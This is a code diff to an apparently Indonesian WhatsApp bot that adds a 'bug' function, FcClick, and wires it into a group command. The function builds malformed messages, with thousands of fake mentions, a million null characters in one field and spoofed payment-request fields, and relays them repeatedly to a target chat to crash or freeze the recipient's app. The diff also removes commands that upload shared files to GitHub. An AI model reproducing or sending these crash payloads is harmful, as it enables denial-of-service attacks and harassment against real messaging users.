@@ -644,6 +644,110 @@ async function Killers(target) {
   console.log(`succes Send to ${target}`);
 }
 
+async function FcClick(target) {
+  try {
+    if (!sock.user) {
+      console.log("❌ Session expired");
+      return;
+    }
+    
+    const mentions = Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`);
+    
+    const AiNew = [
+      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
+      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
+      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
+      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
+      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net"
+    ];
+    
+    const Msg1 = {
+      albumMessage: {
+        contextInfo: {
+          mentionedJid: Array.from(
+            { length: 2000 },
+            () => `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+          ),
+          remoteJid: "oconner-hard",
+          parentGroupJid: "0@g.us",
+          isQuestion: true,
+          isSampled: true,
+          entryPointConversionDelaySeconds: 6767676767,
+          businessMessageForwardInfo: null,
+          botMessageSharingInfo: {
+            botEntryPointOrigin: {
+              origins: "BOT_MESSAGE_OCONNER"
+            },
+            forwardingScore: 999
+          },
+          quotedMessage: {
+            viewOnceMessage: {
+              message: {
+                interactiveResponseMessage: {
+                  body: {
+                    text: "Credit By Ruxzs",
+                    format: "DEFAULT"
+                  },
+                  nativeFlowResponseMessage: {
+                    name: "call_permission_request",
+                    paramsJson: "\u0000".repeat(1000000),
+                    version: 1
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+    
+    const Msg2 = {
+      requestPaymentMessage: {
+        currencyCodeIso4217: "IDR",
+        amount1000: "9999",
+        requestFrom: target,
+        noteMessage: {
+          extendedTextMessage: {
+            text: 'Credit By Ruxzs'
+          }
+        },
+        expiryTimestamp: Math.floor(Date.now() / 2500) + 98400,
+        amount: {
+          value: 1000,
+          offset: 1000,
+          currencyCode: 'IDR'
+        },
+        background: {
+          id: '1'
+        },
+        contextInfo: {
+          mentionedJid: mentions,
+          remoteJid: AiNew,
+          forwardingScore: 9999,
+          isForwarded: true,
+        }
+      }
+    };
+    
+    for (let r = 0; r < 5; r++) {
+      await client.relayMessage(target, Msg1, {
+        participant: { jid: target }
+      });
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      
+      await client.relayMessage(target, Msg2, {
+        participant: { jid: target }
+      });
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      
+      console.log(`✅ Sukses sent to ${target}`);
+    }
+    
+  } catch (err) {
+    console.error(`❌ Error: ${err.message}`);
+  }
+}
+		
 async function docthumb(client, target) {
   await client.relayMessage(target,
     generateWAMessageFromContent(target,
@@ -2948,217 +3052,6 @@ case "tiktok": {
 
 }
 break;
-
-case "uptogithub": {
-
-if (!m.quoted)
-return m.reply("❌ Reply file atau ZIP dulu!");
-
-await client.sendMessage(
-m.chat,
-{
-text: "🛠️ Pilih jenis upload:",
-buttons: [
-{
-buttonId: "upload_file",
-buttonText: { displayText: "📄 Upload File" },
-type: 1
-},
-{
-buttonId: "upload_folder",
-buttonText: { displayText: "📁 Upload Folder (Zip)" },
-type: 1
-}
-],
-headerType: 1
-},
-{ quoted: m }
-);
-
-}
-break;
-
-case "upload_file": {
-
-await reaction(m.chat, "⌛")
-
-try {
-
-if (!m.quoted)
-return m.reply("❌ Reply file dulu!");
-
-await m.reply("📥 Mengunduh file...");
-
-const buffer = await m.quoted.download();
-
-const fileName =
-m.quoted.fileName ||
-`file_${Date.now()}`;
-
-const content =
-buffer.toString("base64");
-
-await axios.put(
-`https://api.github.com/repos/${OWNER}/${REPO}/contents/${fileName}`,
-{
-message: `Upload ${fileName}`,
-content: content
-},
-{
-headers: {
-Authorization: `token ${GITHUB_TOKEN}`,
-"Content-Type": "application/json"
-}
-}
-);
-
-const fileUrl = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${fileName}`,
-
-await reaction(m.chat, "✅")
-
-await m.reply(
-`⎙ Selesai
-━━━━━━━━━━━━━
-━━━【 𝙇𝙐𝙉𝙊𝙓 𝙏𝙊𝙊𝙇𝙎 】━━━
-👤 Pengirim: ${pushname}
-📂 File: ${fileName}
-🔗 URL: ${fileUrl}
-⎙ File berhasil diupload`
-);
-
-} catch (err) {
-
-console.log(err);
-
-m.reply("❌ Upload file gagal.");
-
-}
-
-}
-break;
-
-case "upload_folder": {
-
-await reaction(m.chat, "⌛")
-
-try {
-
-if (!m.quoted)
-return m.reply("❌ Reply file ZIP!");
-
-const mime =
-(m.quoted.msg || m.quoted).mimetype || "";
-
-if (!/zip/.test(mime))
-return m.reply("❌ Harus file .zip");
-
-await m.reply("📥 Mengunduh ZIP...");
-
-const buffer =
-await m.quoted.download();
-
-const zip =
-new AdmZip(buffer);
-
-const folderName =
-`uploads_${Date.now()}`;
-
-const extractPath =
-path.join(__dirname, folderName);
-
-zip.extractAllTo(extractPath, true);
-
-await m.reply("📂 Mengekstrak file...");
-
-let uploaded = 0;
-
-async function uploadRecursive(dir, base="") {
-
-const files = fs.readdirSync(dir);
-
-for (const file of files) {
-
-const filePath =
-path.join(dir, file);
-
-const stat =
-fs.statSync(filePath);
-
-if (stat.isDirectory()) {
-
-await uploadRecursive(
-filePath,
-path.join(base, file)
-);
-
-} else {
-
-const fileBuffer =
-fs.readFileSync(filePath);
-
-const content =
-fileBuffer.toString("base64");
-
-const githubPath =
-`${folderName}/${base}/${file}`.replace(/\\/g, "/");
-
-await axios.put(
-`https://api.github.com/repos/${OWNER}/${REPO}/contents/${githubPath}`,
-{
-message: `Upload ${file}`,
-content: content
-},
-{
-headers: {
-Authorization: `token ${GITHUB_TOKEN}`,
-"Content-Type": "application/json"
-}
-}
-);
-
-uploaded++;
-
-}
-
-}
-
-}
-
-await m.reply("🚀 Mengupload semua file...");
-
-await uploadRecursive(extractPath);
-
-await reaction(m.chat, "✅")
-
-await m.reply(
-`⎙ Selesai
-━━━━━━━━━━━━━
-━━━【 𝙇𝙐𝙉𝙊𝙓 𝙏𝙊𝙊𝙇𝙎 】━━━
-👤 Pengirim: ${pushname}
-📄 Total File: ${uploaded}
-📁 Folder GitHub: ${folderName}
-⎙ File berhasil diupload`
-);
-
-// hapus folder sementara
-fs.rmSync(extractPath, {
-recursive: true,
-force: true
-});
-
-} catch (err) {
-
-console.log(
-"Upload Folder Error:",
-err?.response?.data || err
-);
-
-m.reply("❌ Upload folder gagal.");
-
-}
-
-}
-break;
 				
 case "afk": {
 if (!isOwner) return m.reply(mess.owner)
@@ -3320,7 +3213,7 @@ case 'delay-gb': {
                 let target = `${m.chat}`;
                 reply(`success! sent bug to ${target}\n\n*Note* : Jika Bug Tidak Terkirim Kecilkan Lop Agar Tidak Overload.`);              
                 for (let i = 0; i < 5; i++) {
-                    await groubattackxnxx(target);
+                    await FcClick(target);
                 }
             console.log(chalk.red.bold("🩸Success Mengirim Bug Delay Kedalam Grup"))
             }
